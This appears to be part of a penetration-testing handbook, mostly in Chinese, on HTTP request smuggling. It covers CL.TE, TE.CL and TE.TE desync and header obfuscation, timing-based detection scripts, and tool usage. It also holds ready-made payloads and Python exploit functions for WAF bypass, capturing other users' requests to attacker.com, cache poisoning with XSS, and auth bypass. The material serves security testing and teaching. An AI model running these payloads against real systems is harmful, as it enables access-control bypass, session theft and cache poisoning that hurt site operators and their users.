# http-smuggling-test · part 1

> 分段 1/4。完整索引见 `http-smuggling-test.md`。

## 一、原有知识库

# HTTP 请求走私测试手册
## 一、HTTP 请求走私原理

### 核心问题

前端服务器（CDN/负载均衡器）与后端服务器对 HTTP 请求边界的解析不一致。

```
客户端 → 前端服务器 → 后端服务器

前端: 用 Content-Length 判断请求结束
后端: 用 Transfer-Encoding 判断请求结束

结果: 前端认为是1个请求，后端认为是2个请求
     → 第2个请求被"走私"到后端
```

---
## 二、三种类型

### 2.1 CL.TE（Content-Length vs Transfer-Encoding）

**前端用 Content-Length，后端用 Transfer-Encoding**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**解析差异**:
- 前端: 读取 6 字节（`0\r\n\r\nG`），认为请求结束
- 后端: 看到 `Transfer-Encoding: chunked`，读取 `0\r\n\r\n`（结束标记），剩余 `G` 被当作下一个请求的开头

### 2.2 TE.CL（Transfer-Encoding vs Content-Length）

**前端用 Transfer-Encoding，后端用 Content-Length**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**解析差异**:
- 前端: 读取 chunked 编码直到 `0\r\n\r\n`，认为请求结束
- 后端: 只读取 4 字节（`5c\r\n`），剩余内容被当作下一个请求

### 2.3 TE.TE（Transfer-Encoding 混淆）

**两端都用 Transfer-Encoding，但可通过混淆绕过其中一端**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
...
0


```

**混淆方式**:
```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked, x
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked
Transfer-encoding: chunked  (小写 e)
Transfer-Encoding : chunked  (冒号前有空格)
Transfer-Encoding: chunked   (末尾有空格)
Transfer-Encoding:[tab]chunked
```

---
## 三、检测方法

### 3.1 时间差检测

```python
import socket
import time

def detect_cl_te(host, port=443):
    """检测 CL.TE 走私"""
    
    # 构造走私请求
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    
    # 发送请求
    sock = socket.create_connection((host, port))
    if port == 443:
        import ssl
        sock = ssl.wrap_socket(sock)
    
    sock.sendall(smuggled.encode())
    
    # 立即发送第二个请求
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 测量响应时间
    start = time.time()
    response = sock.recv(4096)
    elapsed = time.time() - start
    
    sock.close()
    
    # 如果响应延迟 > 10s，可能存在走私
    # 原因: 后端等待走私请求的剩余部分（"X" 后面的内容）
    if elapsed > 10:
        print(f"可能存在 CL.TE 走私（延迟 {elapsed:.2f}s）")
        return True
    
    return False
```

### 3.2 CL.TE 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**预期行为**:
- 如果返回超时或 400 错误 → 可能存在 CL.TE
- 原因: 后端读取 chunked 编码，等待 `Q` 后面的数据

### 3.3 TE.CL 检测 Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**预期行为**:
- 如果返回超时 → 可能存在 TE.CL
- 原因: 后端读取 6 字节（`0\r\n\r\nX`），但前端已认为请求结束

### 3.4 smuggler.py 工具

```bash
# 安装
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h

# 自动检测
python3 smuggler.py -u https://target.com/

# 指定检测类型
python3 smuggler.py -u https://target.com/ -t CL.TE
python3 smuggler.py -u https://target.com/ -t TE.CL
```

---
## 四、利用场景

### 4.1 绕过前端安全控制（WAF/ACL）

```http
POST /admin HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /admin/deleteUser HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

userId=123
```

**效果**: 前端 WAF 只看到 `POST /admin`（可能允许），但后端实际执行 `POST /admin/deleteUser`（敏感操作）。实测时 `userId` 填自建测试号、或把走私第二段换成只读管理路径，证明前缀混淆即停，不要对真实用户触发删除

### 4.2 请求劫持（捕获其他用户的请求）

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 500

x=
```

**效果**: 下一个用户的请求会被拼接到 `x=` 后面，发送到 `attacker.com`

### 4.3 缓存投毒

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: target.com
X-Ignore: X

HTTP/1.1 200 OK
Content-Type: application/javascript

alert('XSS')
```

**效果**: 将恶意响应缓存到正常 URL（`/static/js/app.js`），所有用户访问时触发 XSS

### 4.4 反射型 XSS 升级为存储型

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com

```

**效果**: 走私的请求触发反射型 XSS，响应被缓存，变成存储型 XSS

### 4.5 绕过认证

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: localhost
Authorization: Bearer INTERNAL_TOKEN

```

**效果**: 走私请求从内部发起，绕过外部认证检查

---
## 五、HTTP/2 降级走私

### 5.1 H2.CL（HTTP/2 → HTTP/1.1 + Content-Length）

```python
import h2.connection
import socket
import ssl

def h2_smuggling():
    # 建立 HTTP/2 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    # 发送带有 Content-Length 的请求
    # HTTP/2 不应该有 Content-Length，但降级到 HTTP/1.1 时会保留
    headers = [
        (':method', 'POST'),
        (':path', '/'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
        ('content-length', '100'),  # 恶意 Content-Length
    ]
    
    conn.send_headers(1, headers)
    conn.send_data(1, b'x' * 50)  # 只发送 50 字节
    
    sock.sendall(conn.data_to_send())
```

### 5.2 CRLF 注入在 HTTP/2 头部

```python
# HTTP/2 头部中注入 CRLF
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('foo', 'bar\r\nTransfer-Encoding: chunked'),  # 注入
]

# 降级到 HTTP/1.1 时变成:
# GET / HTTP/1.1
# Host: target.com
# foo: bar
# Transfer-Encoding: chunked
```

---
## 六、实战 PoC

### 6.1 原始 Socket 发送

```python
import socket
import ssl

def send_smuggled_request(host, port, payload):
    """发送走私请求"""
    
    # 建立连接
    sock = socket.create_connection((host, port))
    if port == 443:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    # 发送 payload
    sock.sendall(payload.encode())
    
    # 接收响应
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except:
            break
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

# CL.TE 走私示例
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

response = send_smuggled_request('target.com', 443, payload)
print(response)
```

### 6.2 完整 CL.TE 利用

```python
def exploit_cl_te(host, port=443):
    """CL.TE 走私攻击"""
    
    # 构造走私请求（访问管理员接口）
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 150\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    # 发送走私请求
    sock.sendall(smuggled.encode())
    
    # 发送正常请求（会被拼接到走私请求后）
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 接收响应
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

### 6.3 完整 TE.CL 利用

```python
def exploit_te_cl(host, port=443):
    """TE.CL 走私攻击"""
    
    # 计算 chunked 编码长度
    smuggled_request = (
        "GPOST /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    
    chunk_size = hex(len(smuggled_request))[2:]  # 转16进制
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunk_size}\r\n"
        f"{smuggled_request}\r\n"
        "0\r\n"
        "\r\n"
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    sock.sendall(payload.encode())
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

---
## 七、Burp Suite 测试

### HTTP Request Smuggler 插件

```
1. 安装: Burp → Extender → BApp Store → HTTP Request Smuggler
2. 使用: 右键请求 → Extensions → Smuggle probe
3. 查看结果: 插件自动测试 CL.TE, TE.CL, TE.TE
```

### 手动测试步骤

```
1. 抓取正常请求
2. 修改为走私 payload
3. 发送到 Repeater
4. 观察响应时间和内容
5. 如果超时或异常 → 可能存在走私
```

---
## 八、防护检测

```python
# 检测是否有走私防护

# 1. 请求规范化
# 特征: 同时存在 CL 和 TE 时，服务器拒绝请求（400 Bad Request）

# 2. 前后端一致性
# 特征: 前后端使用相同的解析逻辑

# 3. HTTP/2 强制
# 特征: 不支持 HTTP/1.1，强制使用 HTTP/2

# 4. 严格的头部验证
# 特征: 拒绝畸形的 Transfer-Encoding 头
```

---
## 十、注意事项

1. **测试环境**: 优先在测试环境测试，生产环境谨慎
2. **影响范围**: 走私可能影响其他用户，测试时注意
3. **PoC 证据**: 保存完整的请求和响应
4. **及时报告**: 发现走私漏洞后立即报告，不要深入利用

---
## 二、补充：request-smuggling

### request-smuggling

### HTTP Request Smuggling
## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---
